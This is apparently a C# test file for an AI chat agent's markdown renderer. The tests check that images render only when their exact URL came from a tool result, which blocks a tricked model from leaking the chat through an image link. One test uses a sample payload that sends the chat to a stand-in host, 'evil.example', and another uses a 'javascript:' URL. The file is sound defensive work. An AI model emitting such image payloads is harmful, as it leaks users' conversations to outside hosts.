using System.Text.RegularExpressions;
using LouisAgent.Web.Text;

namespace LouisAgent.Web.Tests.Text;

/// <summary>
/// An image renders when its exact URL came back in a tool result of the same turn, whatever its host. A model can't
/// invent a URL that passes, so a tricked model can't send the chat to a host by writing an image. A shop's host still
/// renders without the set.
/// </summary>
public class MarkdownProvenanceTests
{
    private const string Url = "https://example.co.za/wp-content/bobotie.jpg";
    private static readonly IReadOnlySet<string> Shown = new HashSet<string> { Url };

    /// <summary>The HTML this markdown renders to, given these images.</summary>
    private static string Html(string markdown, IReadOnlySet<string>? shown) => Markdown.ToHtml(markdown, shown).Value;

    /// <summary>An image in the set renders as an image.</summary>
    [Test]
    public void AnImageInTheSet_RendersAsAnImage()
    {
        string html = Html($"![Bobotie]({Url})", Shown);

        Assert.That(html, Does.Contain("<img").And.Contain($"src=\"{Url}\""));
    }

    /// <summary>An image not in the set is a link.</summary>
    [Test]
    public void AnImageNotInTheSet_IsALink()
    {
        string html = Html("![Bobotie](https://example.co.za/other.jpg)", Shown);

        Assert.That(html, Does.Not.Contain("<img").And.Contain("<a href=\"https://example.co.za/other.jpg\">"));
    }

    /// <summary>A URL differing only by a query parameter isn't in the set.</summary>
    [Test]
    public void AUrlThatDiffersOnlyByAQueryParameter_IsNotInTheSet() =>
        Assert.That(Html($"![Bobotie]({Url}?x=1)", Shown), Does.Not.Contain("<img"), "exact match, not a prefix or a host");

    /// <summary>A shop's image still renders with an empty set, a null set, or none.</summary>
    [Test]
    public void AShopHostsImage_StillRenders_WithAnEmptySet_ANullSet_OrNone()
    {
        string markdown = "![KOO](https://catalog.sixty60.co.za/a/b.jpg)";

        Assert.That(Html(markdown, new HashSet<string>()), Does.Contain("<img"));
        Assert.That(Html(markdown, null), Does.Contain("<img"));
        Assert.That(Markdown.ToHtml(markdown).Value, Does.Contain("<img"));
    }

    /// <summary>With a null set, another host is a link.</summary>
    [Test]
    public void ANullSet_BehavesAsToday_AnotherHostIsALink() =>
        Assert.That(Html($"![Bobotie]({Url})", null), Does.Not.Contain("<img"));

    /// <summary>An image whose address carries the chat renders no image element.</summary>
    [Test]
    public void TheExfiltrationCase_AnImageWhoseUrlCarriesTheChat_RendersNoImgElement()
    {
        string html = Html("![x](https://evil.example/?q=the+chat) en ![Bobotie](" + Url + ")", Shown);

        Assert.That(Regex.Matches(html, "<img").Count, Is.EqualTo(1), "only the image a tool gave");
        Assert.That(html, Does.Not.Contain("<img src=\"https://evil.example"));
    }

    /// <summary>An unsafe address is never an image.</summary>
    [Test]
    public void AnUnsafeUrl_IsStillNeverAnImage() =>
        Assert.That(Html("![x](javascript:alert(1))", new HashSet<string> { "javascript:alert(1)" }), Does.Not.Contain("<img").And.Not.Contain("javascript:"));
}
